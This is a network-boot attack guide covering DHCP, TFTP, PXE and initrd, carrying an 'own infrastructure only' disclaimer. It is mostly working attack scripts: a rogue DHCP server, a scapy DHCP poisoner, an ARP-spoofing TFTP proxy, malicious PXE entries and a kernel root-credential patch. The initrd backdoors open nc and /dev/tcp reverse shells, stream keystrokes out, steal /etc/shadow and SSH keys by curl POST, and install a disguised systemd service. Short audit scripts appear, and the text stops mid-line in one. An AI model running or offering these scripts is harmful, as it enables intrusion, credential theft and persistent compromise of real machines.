# Network Boot Security: Vulnerabilities, Attacks & Exploitation Guide

## ⚠️ DISCLAIMER
This document is for educational and security testing purposes on YOUR OWN infrastructure only. Unauthorized access to computer systems is illegal. Only test on systems you own or have explicit permission to test.

---

## Table of Contents
1. [Attack Surface Overview](#attack-surface)
2. [DHCP-Based Attacks](#dhcp-attacks)
3. [TFTP Exploitation](#tftp-attacks)
4. [PXE Boot Hijacking](#pxe-hijacking)
5. [Man-in-the-Middle Attacks](#mitm)
6. [Boot File Manipulation](#boot-manipulation)
7. [initrd Backdooring](#initrd-backdoor)
8. [Denial of Service Attacks](#dos-attacks)
9. [Post-Boot Exploitation](#post-boot)
10. [Complete Attack Scenarios](#attack-scenarios)
11. [Detection and Mitigation](#detection-mitigation)
12. [Security Hardening Checklist](#hardening)

---

## 1. Attack Surface Overview {#attack-surface}

### Network Boot Architecture Vulnerabilities

```
┌─────────────────────────────────────────────────────────────┐
│                    Attack Surface Map                        │
└─────────────────────────────────────────────────────────────┘

Client ────[1. DHCP]────> Rogue DHCP Server
   │                      └─> Poisoned boot parameters
   │
   ├────[2. TFTP]────> Unencrypted file transfer
   │                   └─> File interception/modification
   │
   ├────[3. HTTP]────> No integrity checks
   │                   └─> Malicious filesystem injection
   │
   └────[4. NFS]─────> No authentication
                       └─> Root filesystem compromise

Vulnerabilities by Protocol:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Protocol    Encryption    Authentication    Integrity
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
DHCP        ❌ No         ❌ No              ❌ No
TFTP        ❌ No         ❌ No              ❌ No
HTTP        ⚠️  Optional  ⚠️  Optional       ⚠️  Optional
NFS         ⚠️  Optional  ⚠️  Weak           ❌ No
PXE         ❌ No         ❌ No              ❌ No
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### Critical Weaknesses

**Lack of Authentication:**
- No verification of DHCP server legitimacy
- TFTP has no access control
- Boot files can be replaced without detection
- Client has no way to verify server identity

**No Encryption:**
- All traffic in plaintext
- Credentials visible on network
- Boot parameters exposed
- Filesystem contents readable

**No Integrity Checks:**
- Kernel can be replaced
- initrd can be modified
- Configuration files can be altered
- No checksums validated

---

## 2. DHCP-Based Attacks {#dhcp-attacks}

### 2.1 Rogue DHCP Server Attack

**Vulnerability:** DHCP has no authentication. Any device can run a DHCP server.

**Impact:** Complete control over client boot process.

**Exploitation Script:**

```bash
#!/bin/bash
# rogue-dhcp-server.sh
# Runs a malicious DHCP server

apt-get install -y dnsmasq

# Stop legitimate DHCP (if you control it)
# systemctl stop dnsmasq

# Configure rogue DHCP
cat > /tmp/rogue-dhcp.conf << 'EOF'
# Listen on attacker interface
interface=eth0
bind-interfaces

# DHCP range (same as legitimate)
dhcp-range=192.168.1.100,192.168.1.200,12h

# Rogue settings - point to attacker TFTP
dhcp-option=3,192.168.1.1          # Gateway (normal)
dhcp-option=6,8.8.8.8              # DNS (normal)
next-server=192.168.1.66           # ATTACKER IP (malicious)
dhcp-boot=pxelinux.0               # Boot file (malicious version)

# Logging
log-dhcp
log-queries
EOF

# Start rogue DHCP
dnsmasq -C /tmp/rogue-dhcp.conf -d

# Client will receive:
# - IP address
# - Attacker's TFTP server: 192.168.1.66
# - Download malicious pxelinux.0 from attacker
```

**What happens:**
1. Client broadcasts DHCP DISCOVER
2. Both legitimate and rogue servers respond
3. Client accepts first response (race condition)
4. Client boots from attacker's TFTP server
5. Attacker provides backdoored kernel/initrd

**Testing Your Setup:**

```bash
#!/bin/bash
# test-dhcp-security.sh

echo "=== Testing DHCP Security ==="

# Test 1: Check for multiple DHCP servers
echo "1. Scanning for DHCP servers..."
nmap --script broadcast-dhcp-discover

# Test 2: DHCP starvation (DoS)
echo "2. Testing DHCP pool exhaustion..."
# This requests all available IPs
yersinia dhcp -attack 1

# Test 3: Monitor for rogue DHCP responses
echo "3. Monitoring DHCP responses..."
tcpdump -i eth0 -n port 67 and port 68 -v
# Look for multiple servers responding
```

### 2.2 DHCP Spoofing/Poisoning

**Exploitation:**

```python
#!/usr/bin/env python3
# dhcp-poison.py
# Responds to DHCP requests with malicious configuration

from scapy.all import *

ATTACKER_IP = "192.168.1.66"
INTERFACE = "eth0"

def dhcp_poison(pkt):
    if DHCP in pkt and pkt[DHCP].options[0][1] == 1:  # DHCP Discover
        print(f"[+] DHCP Discover from {pkt[Ether].src}")
        
        # Create DHCP Offer with malicious next-server
        offer = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(INTERFACE)) / \
                IP(src=ATTACKER_IP, dst="255.255.255.255") / \
                UDP(sport=67, dport=68) / \
                BOOTP(op=2, yiaddr="192.168.1.100", 
                      siaddr=ATTACKER_IP,  # Malicious TFTP server
                      chaddr=pkt[Ether].src) / \
                DHCP(options=[
                    ("message-type", "offer"),
                    ("server_id", ATTACKER_IP),
                    ("subnet_mask", "255.255.255.0"),
                    ("router", "192.168.1.1"),
                    ("lease_time", 43200),
                    ("name_server", "8.8.8.8"),
                    "end"
                ])
        
        sendp(offer, iface=INTERFACE, verbose=False)
        print(f"[+] Sent malicious DHCP Offer to {pkt[Ether].src}")

print("[*] Starting DHCP poisoning...")
sniff(iface=INTERFACE, filter="udp and (port 67 or port 68)", prn=dhcp_poison)
```

---

## 3. TFTP Exploitation {#tftp-attacks}

### 3.1 TFTP File Interception

**Vulnerability:** TFTP traffic is unencrypted and unauthenticated.

**Exploitation:**

```bash
#!/bin/bash
# tftp-mitm.sh
# Intercepts and modifies TFTP transfers

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing to position between client and server
CLIENT_IP="192.168.1.100"
SERVER_IP="192.168.1.50"
INTERFACE="eth0"

# Poison ARP cache
arpspoof -i $INTERFACE -t $CLIENT_IP $SERVER_IP &
ARPSPOOF_PID1=$!

arpspoof -i $INTERFACE -t $SERVER_IP $CLIENT_IP &
ARPSPOOF_PID2=$!

echo "[+] ARP poisoning active"

# Intercept TFTP with iptables
iptables -t nat -A PREROUTING -p udp --dport 69 -j REDIRECT --to-port 6969

# Run proxy TFTP that modifies files
python3 tftp-proxy.py

# Cleanup
kill $ARPSPOOF_PID1 $ARPSPOOF_PID2
```

**TFTP Proxy (Modifies Files):**

```python
#!/usr/bin/env python3
# tftp-proxy.py
# Proxies TFTP and injects backdoor

import socket
import struct

REAL_SERVER = "192.168.1.50"
PROXY_PORT = 6969

def modify_file(filename, data):
    """Inject backdoor into boot files"""
    
    if filename == b"initrd.img":
        print(f"[!] Intercepting initrd.img - injecting backdoor")
        # Decompress, add backdoor to /init, recompress
        return inject_initrd_backdoor(data)
    
    elif filename == b"pxelinux.cfg/default":
        print(f"[!] Intercepting config - adding malicious entry")
        # Add kernel parameter: init=/bin/sh (root shell)
        data = data.replace(b"quiet", b"quiet init=/bin/sh")
    
    return data

def handle_tftp(data, addr):
    """Proxy TFTP requests and modify responses"""
    
    # Parse TFTP packet
    opcode = struct.unpack(">H", data[:2])[0]
    
    if opcode == 1:  # Read Request (RRQ)
        filename = data[2:].split(b'\x00')[0]
        print(f"[+] TFTP RRQ: {filename.decode()} from {addr}")
        
        # Forward to real server
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(data, (REAL_SERVER, 69))
        
        # Receive file from real server
        file_data = b""
        while True:
            response, _ = sock.recvfrom(65535)
            opcode = struct.unpack(">H", response[:2])[0]
            
            if opcode == 3:  # DATA
                block = struct.unpack(">H", response[2:4])[0]
                file_data += response[4:]
                
                # Send ACK
                ack = struct.pack(">HH", 4, block)
                sock.sendto(ack, (REAL_SERVER, 69))
                
                if len(response) < 516:  # Last packet
                    break
        
        # Modify file before sending to client
        modified_data = modify_file(filename, file_data)
        
        # Send modified file to client
        # (TFTP DATA packet construction...)
        
        return modified_data

# Start proxy
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("0.0.0.0", PROXY_PORT))

print(f"[*] TFTP proxy listening on port {PROXY_PORT}")

while True:
    data, addr = sock.recvfrom(65535)
    handle_tftp(data, addr)
```

### 3.2 TFTP File Replacement

**Direct Attack (No MITM needed):**

```bash
#!/bin/bash
# replace-boot-files.sh
# Directly replaces boot files on TFTP server if accessible

TFTP_SERVER="192.168.1.50"
TFTP_ROOT="/var/lib/tftpboot"

# Test if TFTP write is enabled (often is!)
echo "test" > /tmp/test.txt
atftp -p -l /tmp/test.txt -r test-write.txt $TFTP_SERVER

if [ $? -eq 0 ]; then
    echo "[!] TFTP WRITE ENABLED - Server is vulnerable!"
    
    # Upload backdoored files
    atftp -p -l backdoored-initrd.img -r initrd.img $TFTP_SERVER
    atftp -p -l backdoored-vmlinuz -r vmlinuz $TFTP_SERVER
    
    echo "[+] Malicious files uploaded!"
else
    echo "[*] TFTP write disabled"
fi
```

### 3.3 Testing TFTP Security

```bash
#!/bin/bash
# test-tftp-security.sh

TFTP_SERVER="192.168.1.50"

echo "=== TFTP Security Assessment ==="

# Test 1: Check if TFTP is running
echo "1. TFTP service detection:"
nmap -sU -p 69 $TFTP_SERVER

# Test 2: Test read access
echo "2. Testing read access:"
tftp $TFTP_SERVER << EOF
get pxelinux.0
quit
EOF

if [ -f pxelinux.0 ]; then
    echo "  ✓ Read access confirmed"
    rm pxelinux.0
else
    echo "  ✗ Read access denied"
fi

# Test 3: Test write access (dangerous!)
echo "3. Testing write access:"
echo "test" > /tmp/tftp-test.txt
tftp $TFTP_SERVER << EOF
put /tmp/tftp-test.txt
quit
EOF

# Test 4: Directory traversal
echo "4. Testing directory traversal:"
tftp $TFTP_SERVER << EOF
get ../../../etc/passwd
quit
EOF

# Test 5: Sniff TFTP traffic
echo "5. Monitoring TFTP traffic:"
timeout 10 tcpdump -i eth0 -n port 69 -X
```

---

## 4. PXE Boot Hijacking {#pxe-hijacking}

### 4.1 PXE Boot Parameter Injection

**Attack Vector:** Modify boot parameters to gain root access.

**Exploitation:**

```bash
#!/bin/bash
# inject-boot-params.sh
# Modifies PXE boot configuration to add malicious parameters

TFTP_ROOT="/var/lib/tftpboot"
CONFIG="$TFTP_ROOT/pxelinux.cfg/default"

# Backup original
cp $CONFIG $CONFIG.backup

# Inject malicious parameters
cat >> $CONFIG << 'EOF'

# Malicious entry (hidden at bottom)
LABEL backdoor
    KERNEL vmlinuz
    APPEND initrd=initrd.img init=/bin/sh rw
    # This boots directly to root shell, bypassing all security

LABEL keylog
    KERNEL vmlinuz
    APPEND initrd=initrd.img log_everything=1 send_to=192.168.1.66:9999
    # Logs all keystrokes and sends to attacker

LABEL nfs-hijack
    KERNEL vmlinuz
    APPEND initrd=initrd.img root=nfs:192.168.1.66:/malicious/root ip=dhcp
    # Boots from attacker's NFS server
EOF

echo "[+] Malicious boot entries added"
echo "[+] Default entry remains normal - hard to detect"
```

### 4.2 PXE Configuration Hijacking

**Create Fake Configuration by MAC Address:**

```bash
#!/bin/bash
# targeted-pxe-hijack.sh
# Creates targeted configuration for specific client

TARGET_MAC="00:11:22:33:44:55"
TFTP_ROOT="/var/lib/tftpboot"

# PXE searches for: 01-MAC-ADDRESS
CONFIG_NAME="01-$(echo $TARGET_MAC | tr ':' '-')"
CONFIG_PATH="$TFTP_ROOT/pxelinux.cfg/$CONFIG_NAME"

# Create targeted malicious config
cat > $CONFIG_PATH << 'EOF'
DEFAULT malicious
TIMEOUT 1

LABEL malicious
    KERNEL vmlinuz
    APPEND initrd=backdoor-initrd.img root=nfs:192.168.1.66:/evil ip=dhcp init=/root/backdoor.sh
EOF

echo "[+] Created targeted config: $CONFIG_PATH"
echo "[+] Only client $TARGET_MAC will use malicious config"
echo "[+] Other clients will use default config (stealthy)"
```

### 4.3 Testing PXE Security

```bash
#!/bin/bash
# test-pxe-security.sh

TFTP_SERVER="192.168.1.50"

echo "=== PXE Security Assessment ==="

# Test 1: Check configuration protection
echo "1. Configuration file permissions:"
ls -la /var/lib/tftpboot/pxelinux.cfg/

# Test 2: Try to retrieve configurations
echo "2. Testing config retrieval:"
for mac in 00-11-22-33-44-55 88-99-aa-bb-cc-dd; do
    tftp $TFTP_SERVER << EOF
get pxelinux.cfg/01-$mac
quit
EOF
done

# Test 3: Check for dangerous boot parameters
echo "3. Scanning for dangerous parameters:"
grep -r "init=/bin/sh\|init=/bin/bash\|single\|emergency" \
    /var/lib/tftpboot/pxelinux.cfg/

# Test 4: Enumerate all configs
echo "4. Enumerating all configurations:"
tftp $TFTP_SERVER << EOF
get pxelinux.cfg/default
quit
EOF

if [ -f default ]; then
    echo "  Configuration contents:"
    cat default
fi
```

---

## 5. Man-in-the-Middle Attacks {#mitm}

### 5.1 Complete MITM Setup

**Full Network Boot Interception:**

```bash
#!/bin/bash
# complete-mitm.sh
# Complete MITM attack on network boot

CLIENT_IP="192.168.1.100"
SERVER_IP="192.168.1.50"
ATTACKER_IP="192.168.1.66"
INTERFACE="eth0"

echo "=== Setting up Complete MITM ==="

# 1. Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. ARP spoofing
echo "[*] Starting ARP spoofing..."
arpspoof -i $INTERFACE -t $CLIENT_IP $SERVER_IP > /dev/null 2>&1 &
ARPSPOOF1=$!
arpspoof -i $INTERFACE -t $SERVER_IP $CLIENT_IP > /dev/null 2>&1 &
ARPSPOOF2=$!

sleep 2

# 3. Intercept and modify DHCP
echo "[*] Intercepting DHCP..."
python3 << 'PYTHON'
from scapy.all import *
import sys

def modify_dhcp(pkt):
    if DHCP in pkt:
        if pkt[DHCP].options[0][1] == 2:  # DHCP Offer
            # Modify next-server to attacker
            print("[+] Modifying DHCP Offer")
            pkt[BOOTP].siaddr = "192.168.1.66"
            del pkt[IP].chksum
            del pkt[UDP].chksum
            return pkt
    return pkt

sniff(iface="eth0", prn=lambda x: send(modify_dhcp(x)), filter="udp port 67 or 68")
PYTHON

# 4. Intercept TFTP
iptables -t nat -A PREROUTING -p udp --dport 69 -j DNAT --to $ATTACKER_IP:69

# 5. Run malicious TFTP server
echo "[*] Starting malicious TFTP server..."
python3 malicious-tftp-server.py &

# 6. Intercept HTTP (if used)
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to $ATTACKER_IP:80

echo "[+] MITM active - all traffic intercepted"

# Cleanup function
cleanup() {
    echo "[*] Cleaning up..."
    kill $ARPSPOOF1 $ARPSPOOF2
    iptables -t nat -F
    echo 0 > /proc/sys/net/ipv4/ip_forward
}

trap cleanup EXIT
```

### 5.2 SSL Strip Attack (HTTP Boot)

**For systems using HTTP to download filesystem:**

```python
#!/usr/bin/env python3
# sslstrip-netboot.py
# Downgrades HTTPS to HTTP and intercepts

from mitmproxy import http
from mitmproxy.tools.main import mitmdump

def request(flow: http.HTTPFlow) -> None:
    """Intercept filesystem downloads"""
    
    if "filesystem.squashfs" in flow.request.pretty_url:
        print(f"[!] Intercepting filesystem download")
        
        # Replace with backdoored version
        flow.response = http.HTTPResponse.make(
            200,
            open("/tmp/backdoored-filesystem.squashfs", "rb").read(),
            {"Content-Type": "application/octet-stream"}
        )
    
    elif "initrd.img" in flow.request.pretty_url:
        print(f"[!] Intercepting initrd download")
        flow.response = http.HTTPResponse.make(
            200,
            open("/tmp/backdoored-initrd.img", "rb").read(),
            {"Content-Type": "application/octet-stream"}
        )

# Run: mitmproxy -s sslstrip-netboot.py --mode transparent
```

---

## 6. Boot File Manipulation {#boot-manipulation}

### 6.1 Kernel Backdoor

**Inject Backdoor into Kernel:**

```bash
#!/bin/bash
# backdoor-kernel.sh
# Compiles kernel with backdoor

cd /usr/src/linux

# Add backdoor to kernel init
cat >> init/main.c << 'EOF'

/* Backdoor: Always run as root */
static int __init backdoor_init(void) {
    struct cred *cred = prepare_creds();
    if (cred) {
        cred->uid.val = 0;
        cred->gid.val = 0;
        cred->euid.val = 0;
        cred->egid.val = 0;
        commit_creds(cred);
    }
    return 0;
}
late_initcall(backdoor_init);
EOF

# Compile
make -j$(nproc)
cp arch/x86/boot/bzImage /var/lib/tftpboot/vmlinuz

echo "[+] Backdoored kernel deployed"
```

### 6.2 Bootloader Modification

**Modify pxelinux.0 to Log Credentials:**

```python
#!/usr/bin/env python3
# patch-pxelinux.py
# Patches pxelinux.0 to exfiltrate data

with open("pxelinux.0", "rb") as f:
    data = bytearray(f.read())

# Find network code section (simplified)
# In reality, requires understanding of pxelinux.0 structure

# Add code to send boot parameters to attacker
# This is complex and requires assembly knowledge

# Simplified example: Modify TFTP requests to include tracking
data = data.replace(
    b"\x00pxelinux.cfg\x00",
    b"\x00pxelinux.cfg?id=" + get_client_id() + b"\x00"
)

with open("pxelinux.0.backdoored", "wb") as f:
    f.write(data)

print("[+] Backdoored pxelinux.0 created")
```

---

## 7. initrd Backdooring {#initrd-backdoor}

### 7.1 Complete initrd Backdoor

**Most Powerful Attack - Runs Before Any Security:**

```bash
#!/bin/bash
# backdoor-initrd.sh
# Injects comprehensive backdoor into initrd

INITRD="initrd.img"
WORK_DIR="initrd-backdoor"

echo "=== Backdooring initrd ==="

# 1. Extract initrd
mkdir -p $WORK_DIR
cd $WORK_DIR
zcat ../$INITRD | cpio -idm

# 2. Backup original init
cp init init.original

# 3. Create backdoored init
cat > init << 'INIT_BACKDOOR'
#!/bin/sh

# ═══════════════════════════════════════════════════════
# BACKDOOR SECTION - Runs before anything else
# ═══════════════════════════════════════════════════════

# Mount essentials
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs devtmpfs /dev

# Load network modules
modprobe e1000
modprobe e1000e

# Configure network
ip link set eth0 up
udhcpc -i eth0 -n -q

# ──────────────────────────────────────────────────────
# Backdoor 1: Reverse Shell
# ──────────────────────────────────────────────────────
ATTACKER_IP="192.168.1.66"
ATTACKER_PORT="4444"

(
    while true; do
        /bin/sh -i 2>&1 | nc $ATTACKER_IP $ATTACKER_PORT
        sleep 60
    done
) &

# ──────────────────────────────────────────────────────
# Backdoor 2: SSH Backdoor
# ──────────────────────────────────────────────────────
# Add attacker's SSH key
mkdir -p /root/.ssh
cat > /root/.ssh/authorized_keys << 'SSHKEY'
ssh-rsa AAAAB3... attacker@evil
SSHKEY

chmod 600 /root/.ssh/authorized_keys

# Start SSH server (if available)
if [ -x /usr/sbin/dropbear ]; then
    dropbear -r /etc/dropbear/dropbear_rsa_host_key -p 22 &
fi

# ──────────────────────────────────────────────────────
# Backdoor 3: Keylogger
# ──────────────────────────────────────────────────────
(
    while true; do
        cat /dev/input/event0 | \
        nc $ATTACKER_IP 5555 &
        sleep 300
    done
) &

# ──────────────────────────────────────────────────────
# Backdoor 4: Exfiltrate Credentials
# ──────────────────────────────────────────────────────
(
    sleep 60
    # Wait for system to boot, then steal data
    tar -czf /tmp/loot.tar.gz \
        /etc/shadow \
        /etc/passwd \
        /root/.ssh \
        /home/*/.ssh \
        /etc/network \
        2>/dev/null
    
    curl -X POST --data-binary @/tmp/loot.tar.gz \
        http://$ATTACKER_IP:8080/loot
    
    rm /tmp/loot.tar.gz
) &

# ──────────────────────────────────────────────────────
# Backdoor 5: Persistence
# ──────────────────────────────────────────────────────
# Inject into real root filesystem
inject_persistence() {
    ROOT_FS="/newroot"
    
    # Add cron job
    echo "*/5 * * * * /bin/sh -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1" \
        >> $ROOT_FS/var/spool/cron/crontabs/root
    
    # Add systemd service
    cat > $ROOT_FS/etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Maintenance Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/sh -c 'while true; do /bin/sh -i 2>&1 | nc $ATTACKER_IP $ATTACKER_PORT; sleep 60; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    
    # Enable service
    ln -s /etc/systemd/system/backdoor.service \
        $ROOT_FS/etc/systemd/system/multi-user.target.wants/backdoor.service
}

# ══════════════════════════════════════════════════════
# Original Boot Process (appears normal)
# ══════════════════════════════════════════════════════

# Continue with original init script
. /init.original

# Before switching root, inject persistence
inject_persistence

# Switch to real root (everything appears normal)
exec switch_root /newroot /sbin/init

INIT_BACKDOOR

chmod +x init

# 4. Repack initrd
find . | cpio -o -H newc | gzip -9 > ../initrd.img.backdoored
cd ..

echo "[+] Backdoored initrd created: initrd.img.backdoored"
echo "[+] Deploy this to /var/lib/tftpboot/initrd.img"

# Cleanup
rm -rf $WORK_DIR
```

### 7.2 Subtle initrd Modification

**Less Obvious Backdoor:**

```bash
#!/bin/bash
# subtle-initrd-backdoor.sh
# Makes minimal changes - harder to detect

INITRD="initrd.img"
WORK_DIR="initrd-work"

mkdir -p $WORK_DIR
cd $WORK_DIR
zcat ../$INITRD | cpio -idm

# Just add ONE line to existing init script
# Insert after network configuration, before anything else

sed -i '/udhcpc.*eth0/a \
# Appears to be DNS configuration (actually reverse shell)\
(while true; do sh -i 2>&1|nc 192.168.1.66 443>/dev/null 2>&1;sleep 300;done)&' init

# Repack
find . | cpio -o -H newc | gzip -9 > ../initrd.img.subtle
cd ..

echo "[+] Subtle backdoor added"
echo "[+] Only ONE line added - very hard to spot in audit"
```

### 7.3 Testing initrd Security

```bash
#!/bin/bash
# audit-initrd.sh
# Checks initrd for malicious modifications

INITRD="initrd.img"
EXTRACT_DIR="initrd-audit"

echo "=== Auditing initrd for backdoors ==="

mkdir -p $EXTRACT_DIR
cd $EXTRACT_DIR
zcat ../$INITRD | cpio -idm 2>/dev/null

# Check 1: Look for suspicious network connections
echo "1. Suspicious network activity:"
grep -r "nc \|net